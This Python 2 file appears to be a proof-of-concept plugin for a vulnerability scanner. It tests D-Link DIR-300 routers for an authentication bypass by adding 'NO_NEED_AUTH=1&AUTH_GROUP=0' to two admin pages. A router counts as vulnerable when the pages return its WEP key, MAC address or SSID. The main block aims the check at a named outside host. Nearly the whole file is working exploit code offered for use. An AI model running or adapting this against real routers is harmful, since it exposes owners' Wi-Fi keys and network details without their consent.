#!/usr/bin/env python
# -*- coding: utf-8 -*-
import urlparse
import time
import re

"""
POC Name  :  D-Link DIR-300 2处未授权访问
Author    :  a
mail      :  a@lcx.cc
Referer   :  http://www.wooyun.org/bugs/wooyun-2010-066799
"""
from ..miniCurl import Curl
from ..t  import T


class P(T):
    def __init__(self):
        T.__init__(self)
    def verify(self,head='',context='',ip='',port='',productname={},keywords='',hackinfo=''):
        arg='http://'+ip+':'+port+'/'
        curl=Curl()
        result = {}
        result['result']=False

        
        payload = (
            'bsc_wlan.php?NO_NEED_AUTH=1&AUTH_GROUP=0',
            'st_device.php?NO_NEED_AUTH=1&AUTH_GROUP=0'
            )
        url1 = arg + payload[0]
        
        code, head,res, errcode, _ = curl.curl2(url1)
        if  code==200 and 'Wi-Fi Protected' in res and 'WEP Key' in res:
            output(url1,result,'hole')
    
        url2 = arg + payload[1]
        code, head,res, errcode, _ = curl.curl2(url2)
        if  code==200 and 'MAC' in res and 'SSID' in res:
            output(url2,result,'hole')
    
    

        del curl
        return result


def output(url,result,label):
    info = url + '  d-link  Vul '
    result['result']=True
    result['VerifyInfo'] = {}
    result['VerifyInfo']['type']='d-link Vul'
    result['VerifyInfo']['URL'] =url
    result['VerifyInfo']['payload']='/root/github/poccreate/thirdparty/d-link/d-link_aafcc785bc4272b60279b6bedd38d27f.py'
    result['VerifyInfo']['level']=label
    result['VerifyInfo']['result'] =info

if __name__ == '__main__':
    print P().verify(ip='http://yunlai.cn:803/sfdsfds/',port='80')

#/root/github/poccreate/thirdparty/d-link/d-link_aafcc785bc4272b60279b6bedd38d27f.py
#/root/github/poccreate/codesrc/exp-1922.py